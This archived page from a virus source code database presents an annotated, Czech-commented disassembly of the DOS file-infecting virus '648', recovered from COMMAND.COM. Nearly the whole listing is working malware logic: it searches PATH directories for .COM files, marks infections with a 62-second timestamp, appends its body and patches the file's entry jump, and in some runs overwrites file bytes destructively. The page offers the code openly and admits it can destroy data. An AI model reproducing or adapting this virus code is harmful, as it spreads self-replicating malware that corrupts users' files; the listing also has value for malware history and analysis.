<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: 648_asm</title>
<meta name="KEYWORDS" content="648.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for 648.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="1000year_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1000year_asm.php">1000year_asm</a><br><a href="102_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/102_asm.php">102_asm</a><br><a href="1260__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1260__asm.php">1260__asm</a><br><a href="1260_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1260_asm.php">1260_asm</a><br><a href="133_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/133_asm.php">133_asm</a><br><a href="134_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/134_asm.php">134_asm</a><br><a href="1575_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575_asm.php">1575_asm</a><br><a href="1575_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575_e_asm.php">1575_e_asm</a><br><a href="1575-org_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575-org_asm.php">1575-org_asm</a><br><a href="1701_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1701_asm.php">1701_asm</a><br><a href="1704__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1704__asm.php">1704__asm</a><br><a href="1704_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1704_asm.php">1704_asm</a><br><a href="1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1808_asm.php">1808_asm</a><br><a href="1888_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1888_asm.php">1888_asm</a><br><a href="1963_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1963_asm.php">1963_asm</a><br><a href="196_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/196_asm.php">196_asm</a><br><a href="1992_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1992_asm.php">1992_asm</a><br><a href="1ststar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1ststar_asm.php">1ststar_asm</a><br><a href="1stvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1stvirus_asm.php">1stvirus_asm</a><br><a href="203_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/203_asm.php">203_asm</a><br><a href="2249_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2249_asm.php">2249_asm</a><br><a href="2350_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2350_asm.php">2350_asm</a><br><a href="2400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2400_asm.php">2400_asm</a><br><a href="2471_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2471_asm.php">2471_asm</a><br><a href="2501_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2501_asm.php">2501_asm</a><br><a href="2564_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2564_asm.php">2564_asm</a><br><a href="2626_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2626_asm.php">2626_asm</a><br><a href="2715_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2715_asm.php">2715_asm</a><br><a href="29bytes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/29bytes_asm.php">29bytes_asm</a><br><a href="3066_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/3066_asm.php">3066_asm</a><br><a href="30_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/30_asm.php">30_asm</a><br><a href="334_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/334_b_asm.php">334_b_asm</a><br><a href="334-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/334-b_asm.php">334-b_asm</a><br><a href="382_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/382_asm.php">382_asm</a><br><a href="405_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_a_asm.php">405_a_asm</a><br><a href="405__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405__asm.php">405__asm</a><br><a href="405_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_asm.php">405_asm</a><br><a href="405_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_b_asm.php">405_b_asm</a><br><a href="4096a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096a_asm.php">4096a_asm</a><br><a href="4096____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096____asm.php">4096____asm</a><br><a href="4096___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096___asm.php">4096___asm</a><br><a href="4096__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096__asm.php">4096__asm</a><br><a href="4096_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096_asm.php">4096_asm</a><br><a href="42bites_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/42bites_asm.php">42bites_asm</a><br><a href="44__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/44__asm.php">44__asm</a><br><a href="44_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/44_asm.php">44_asm</a><br><a href="45_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/45_asm.php">45_asm</a><br><a href="500_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/500_asm.php">500_asm</a><br><a href="5120_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/5120_asm.php">5120_asm</a><br><a href="512__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512__asm.php">512__asm</a><br><a href="512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_asm.php">512_asm</a><br><a href="512_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_e_asm.php">512_e_asm</a><br><a href="512-e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512-e_asm.php">512-e_asm</a><br><a href="512_f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_f_asm.php">512_f_asm</a><br><a href="512-f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512-f_asm.php">512-f_asm</a><br><a href="534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/534_asm.php">534_asm</a><br><a href="541__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/541__asm.php">541__asm</a><br><a href="541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/541_asm.php">541_asm</a><br><a href="560_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/560_asm.php">560_asm</a><br><a href="578_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/578_asm.php">578_asm</a><br><a href="583_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/583_asm.php">583_asm</a><br><a href="583virus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/583virus_asm.php">583virus_asm</a><br><a href="648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/648_asm.php">648_asm</a><br><a href="7son_284_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son_284_asm.php">7son_284_asm</a><br><a href="7son_332_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son_332_asm.php">7son_332_asm</a><br><a href="7son426b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son426b_asm.php">7son426b_asm</a><br><a href="7son-473_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son-473_asm.php">7son-473_asm</a><br><a href="7son473b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son473b_asm.php">7son473b_asm</a><br><a href="7th_son4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7th_son4_asm.php">7th_son4_asm</a><br><a href="7th_son__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7th_son__asm.php">7th_son__asm</a><br><a href="808__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/808__asm.php">808__asm</a><br><a href="808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/808_asm.php">808_asm</a><br><a href="80hex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/80hex_asm.php">80hex_asm</a><br><a href="90210_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/90210_asm.php">90210_asm</a><br></td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/a/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/a/index.php'" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/b/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/b/index.php'" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/c/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/c/index.php'" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/d/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/d/index.php'" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/e/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/e/index.php'" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/f/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/f/index.php'" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/h/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/h/index.php'" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/i/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/i/index.php'" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/j/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/j/index.php'" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/k/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/k/index.php'" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/l/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/l/index.php'" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/m/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/m/index.php'" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/n/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/n/index.php'" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/o/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/o/index.php'" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/p/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/p/index.php'" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/q/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/q/index.php'" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/r/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/r/index.php'" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/s/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/s/index.php'" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/t/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/t/index.php'" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/u/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/u/index.php'" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/w/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/w/index.php'" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/x/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/x/index.php'" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/y/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/y/index.php'" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;=============================================================
;                        VIRUS 648
;-------------------------------------------------------------
; Virus byl vypreparovan ze souboru COMMAND.COM.
; Nakaza:   jaro 1988.
;
; Nakaza u tohot viru je indikovana nastavenim casu modifikace souboru
; 62 sec.
;
3BD2:5DEF 51             PUSH   CX
3BD2:5DF0 BAE85F         MOV    DX,5FE8    ; Pocatek dat do DX.
3BD2:5DF3 FC             CLD               ;=================================
3BD2:5DF4 8BF2           MOV    SI,DX      ; Obnoveni puvodnich instrukci na
3BD2:5DF6 81C60A00       ADD    SI,000A    ; adrese 100...103 ulohy typu COM.
3BD2:5DFA BF0001         MOV    DI,0100    ;
3BD2:5DFD B90300         MOV    CX,0003    ;
3BD2:5E00 F3             REPZ              ;
3BD2:5E01 A4             MOVSB             ;=================================
3BD2:5E02 8BF2           MOV    SI,DX      ; Obnoveni pocatku dat.
3BD2:5E04 B430           MOV    AH,30      ; Verze DOSu
3BD2:5E06 CD21           INT    21         ;---------------------------------
3BD2:5E08 3C00           CMP    AL,00      ; Pokud pred verzi 2.00, koncime.
3BD2:5E0A 7503           JNZ    5E0F
3BD2:5E0C E9C701         JMP    5FD6       ; Skok na konec programu.
3BD2:5E0F 06             PUSH   ES
3BD2:5E10 B42F           MOV    AH,2F      ; Adresa DTA.
3BD2:5E12 CD21           INT    21         ;---------------------------------
3BD2:5E14 899C0000       MOV    [SI+0000],BX   ; Ulozeni adresy DTA.
3BD2:5E18 8C840200       MOV    [SI+0002],ES
3BD2:5E1C 07             POP    ES
3BD2:5E1D BA5F00         MOV    DX,005F    ; Offset nove DTA od pocatku
3BD2:5E20 90             NOP               ; datove oblasti.
3BD2:5E21 03D6           ADD    DX,SI
3BD2:5E23 B41A           MOV    AH,1A      ; Nastavenie novej DTA.
3BD2:5E25 CD21           INT    21
3BD2:5E27 06             PUSH   ES
3BD2:5E28 56             PUSH   SI
3BD2:5E29 8E062C00       MOV    ES,[002C]  ; Prostredi.
3BD2:5E2D BF0000         MOV    DI,0000    ;
3BD2:5E30 5E             POP    SI         ; Hledame PATH=
3BD2:5E31 56             PUSH   SI         ;
3BD2:5E32 81C61A00       ADD    SI,001A    ; Prohledavani je koncipovane tak,
3BD2:5E36 AC             LODSB             ; ze se nepredpoklada neexistence
3BD2:5E37 B90080         MOV    CX,8000    ; promenne PATH.
3BD2:5E3A F2             REPNZ             ; Hledani "P"
3BD2:5E3B AE             SCASB             ;
3BD2:5E3C B90400         MOV    CX,0004    ; Hledani "ATH=".
3BD2:5E3F AC             LODSB             ;
3BD2:5E40 AE             SCASB             ;
3BD2:5E41 75ED           JNZ    5E30       ;
3BD2:5E43 E2FA           LOOP   5E3F       ;---------------------------------
3BD2:5E45 5E             POP    SI            ; Obnoveni ukazatele na pocatek
3BD2:5E46 07             POP    ES            ; datove oblasti.
3BD2:5E47 89BC1600       MOV    [SI+0016],DI  ; Ulozeni ukazatele na prvni
3BD2:5E4B 8BFE           MOV    DI,SI         ; adresar v PATH.
3BD2:5E4D 81C71F00       ADD    DI,001F
3BD2:5E51 8BDE           MOV    BX,SI
3BD2:5E53 81C61F00       ADD    SI,001F
3BD2:5E57 8BFE           MOV    DI,SI
3BD2:5E59 EB3A           JMP    5E95          ;===============================
3BD2:5E5B 83BC160000     CMP    Word Ptr [SI+0016],+00
3BD2:5E60 7503           JNZ    5E65
3BD2:5E62 E96301         JMP    5FC8
3BD2:5E65 1E             PUSH   DS
3BD2:5E66 56             PUSH   SI
3BD2:5E67 268E1E2C00     MOV    DS,ES:[002C]
3BD2:5E6C 8BFE           MOV    DI,SI
3BD2:5E6E 268BB51600     MOV    SI,ES:[DI+0016]
3BD2:5E73 81C71F00       ADD    DI,001F
3BD2:5E77 AC             LODSB
3BD2:5E78 3C3B           CMP    AL,3B
3BD2:5E7A 740A           JZ     5E86
3BD2:5E7C 3C00           CMP    AL,00
3BD2:5E7E 7403           JZ     5E83
3BD2:5E80 AA             STOSB
3BD2:5E81 EBF4           JMP    5E77
3BD2:5E83 BE0000         MOV    SI,0000
3BD2:5E86 5B             POP    BX
3BD2:5E87 1F             POP    DS
3BD2:5E88 89B71600       MOV    [BX+0016],SI
3BD2:5E8C 807DFF5C       CMP    Byte Ptr [DI-01],5C
3BD2:5E90 7403           JZ     5E95
3BD2:5E92 B05C           MOV    AL,5C
3BD2:5E94 AA             STOSB
3BD2:5E95 89BF1800       MOV    [BX+0018],DI  ; Preneseni retezce
3BD2:5E99 8BF3           MOV    SI,BX         ; "\*.COM".
3BD2:5E9B 81C61000       ADD    SI,0010       ;
3BD2:5E9F B90600         MOV    CX,0006       ;
3BD2:5EA2 F3             REPZ
3BD2:5EA3 A4             MOVSB
3BD2:5EA4 8BF3           MOV    SI,BX
3BD2:5EA6 B44E           MOV    AH,4E       ; Hledej prvy soubor.
3BD2:5EA8 BA1F00         MOV    DX,001F     ; DS:DX - ukazatel na jmeno.
3BD2:5EAB 90             NOP                ;
3BD2:5EAC 03D6           ADD    DX,SI       ;
3BD2:5EAE B90300         MOV    CX,0003     ; CX    - atributy souboru.
3BD2:5EB1 CD21           INT    21          ;-------------------------------
3BD2:5EB3 EB04           JMP    5EB9        ;
3BD2:5EB5 B44F           MOV    AH,4F       ; Hledej nasledujici soubor.
3BD2:5EB7 CD21           INT    21          ;-------------------------------
3BD2:5EB9 7302           JNB    5EBD           ; Soubor nebyl nalezen - SKOK
3BD2:5EBB EB9E           JMP    5E5B           ;
3BD2:5EBD 8B847500       MOV    AX,[SI+0075]   ;
3BD2:5EC1 241F           AND    AL,1F          ; Je cas 62 sec ?
3BD2:5EC3 3C1F           CMP    AL,1F          ;
3BD2:5EC5 74EE           JZ     5EB5           ; Pokracuj v hledani.
3BD2:5EC7 81BC790000FA   CMP    Word Ptr [SI+0079],FA00  ; Velikost souboru.
3BD2:5ECD 77E6           JA     5EB5                     ; Prilis velky.
3BD2:5ECF 83BC79000A     CMP    Word Ptr [SI+0079],+0A
3BD2:5ED4 72DF           JB     5EB5                     ; Prilis maly.
3BD2:5ED6 8BBC1800       MOV    DI,[SI+0018]
3BD2:5EDA 56             PUSH   SI
3BD2:5EDB 81C67D00       ADD    SI,007D        ; Preneseni jmena souboru.
3BD2:5EDF AC             LODSB                 ;
3BD2:5EE0 AA             STOSB                 ;
3BD2:5EE1 3C00           CMP    AL,00          ;
3BD2:5EE3 75FA           JNZ    5EDF           ;-----------------------------
3BD2:5EE5 5E             POP    SI
3BD2:5EE6 B80043         MOV    AX,4300       ; Cti mod pristupu.
3BD2:5EE9 BA1F00         MOV    DX,001F       ; DS:DX         jmeno souboru.
3BD2:5EEC 90             NOP                  ;
3BD2:5EED 03D6           ADD    DX,SI         ;
3BD2:5EEF CD21           INT    21            ;-----------------------------
3BD2:5EF1 898C0800       MOV    [SI+0008],CX
3BD2:5EF5 B80143         MOV    AX,4301       ; Zmen mod pristupu.
3BD2:5EF8 81E1FEFF       AND    CX,FFFE       ;
3BD2:5EFC BA1F00         MOV    DX,001F       ;
3BD2:5EFF 90             NOP                  ;
3BD2:5F00 03D6           ADD    DX,SI         ;
3BD2:5F02 CD21           INT    21            ;-----------------------------
3BD2:5F04 B8023D         MOV    AX,3D02       ; Otevri soubor.
3BD2:5F07 BA1F00         MOV    DX,001F       ;
3BD2:5F0A 90             NOP                  ;
3BD2:5F0B 03D6           ADD    DX,SI         ;
3BD2:5F0D CD21           INT    21            ;-----------------------------
3BD2:5F0F 7303           JNB    5F14
3BD2:5F11 E9A500         JMP    5FB9          ;
3BD2:5F14 8BD8           MOV    BX,AX         ;
3BD2:5F16 B80057         MOV    AX,5700       ; Cti cas a datum zmeny.
3BD2:5F19 CD21           INT    21            ;-----------------------------
3BD2:5F1B 898C0400       MOV    [SI+0004],CX  ; Cti systemovy cas.
3BD2:5F1F 89940600       MOV    [SI+0006],DX  ;
3BD2:5F23 B42C           MOV    AH,2C         ;
3BD2:5F25 CD21           INT    21            ;-----------------------------
3BD2:5F27 80E607         AND    DH,07         ; Sekundy
3BD2:5F2A 7510           JNZ    5F3C
3BD2:5F2C B440           MOV    AH,40         ; Zapis do souboru.
3BD2:5F2E B90500         MOV    CX,0005       ;
3BD2:5F31 8BD6           MOV    DX,SI         ; Destruktivni zmena.
3BD2:5F33 81C28A00       ADD    DX,008A       ;
3BD2:5F37 CD21           INT    21            ;-----------------------------
3BD2:5F39 EB65           JMP    5FA0
3BD2:5F3B 90             NOP
3BD2:5F3C B43F           MOV    AH,3F         ; Cteni ze souboru.
3BD2:5F3E B90300         MOV    CX,0003       ;
3BD2:5F41 BA0A00         MOV    DX,000A       ;
3BD2:5F44 90             NOP                  ;
3BD2:5F45 03D6           ADD    DX,SI         ;
3BD2:5F47 CD21           INT    21            ;-----------------------------
3BD2:5F49 7255           JB     5FA0
3BD2:5F4B 3D0300         CMP    AX,0003
3BD2:5F4E 7550           JNZ    5FA0
3BD2:5F50 B80242         MOV    AX,4202       ; SEEK
3BD2:5F53 B90000         MOV    CX,0000       ;
3BD2:5F56 BA0000         MOV    DX,0000       ;
3BD2:5F59 CD21           INT    21            ;----------------------------
3BD2:5F5B 7243           JB     5FA0
3BD2:5F5D 8BC8           MOV    CX,AX
3BD2:5F5F 2D0300         SUB    AX,0003
3BD2:5F62 89840E00       MOV    [SI+000E],AX
3BD2:5F66 81C1F902       ADD    CX,02F9
3BD2:5F6A 8BFE           MOV    DI,SI
3BD2:5F6C 81EFF701       SUB    DI,01F7
3BD2:5F70 890D           MOV    [DI],CX
3BD2:5F72 B440           MOV    AH,40         ; Zapis do souboru.
3BD2:5F74 B98802         MOV    CX,0288       ;
3BD2:5F77 8BD6           MOV    DX,SI         ;
3BD2:5F79 81EAF901       SUB    DX,01F9       ;
3BD2:5F7D CD21           INT    21            ;----------------------------
3BD2:5F7F 721F           JB     5FA0
3BD2:5F81 3D8802         CMP    AX,0288
3BD2:5F84 751A           JNZ    5FA0
3BD2:5F86 B80042         MOV    AX,4200       ; SEEK
3BD2:5F89 B90000         MOV    CX,0000       ;
3BD2:5F8C BA0000         MOV    DX,0000       ;
3BD2:5F8F CD21           INT    21            ;----------------------------
3BD2:5F91 720D           JB     5FA0
3BD2:5F93 B440           MOV    AH,40
3BD2:5F95 B90300         MOV    CX,0003       ; Zapis do souboru.
3BD2:5F98 8BD6           MOV    DX,SI         ;
3BD2:5F9A 81C20D00       ADD    DX,000D       ;
3BD2:5F9E CD21           INT    21            ;----------------------------
3BD2:5FA0 8B940600       MOV    DX,[SI+0006]
3BD2:5FA4 8B8C0400       MOV    CX,[SI+0004]
3BD2:5FA8 81E1E0FF       AND    CX,FFE0
3BD2:5FAC 81C91F00       OR     CX,001F
3BD2:5FB0 B80157         MOV    AX,5701       ; Nastav cas modifikace.
3BD2:5FB3 CD21           INT    21            ;----------------------------
3BD2:5FB5 B43E           MOV    AH,3E         ; Uzavri soubor.
3BD2:5FB7 CD21           INT    21            ;----------------------------
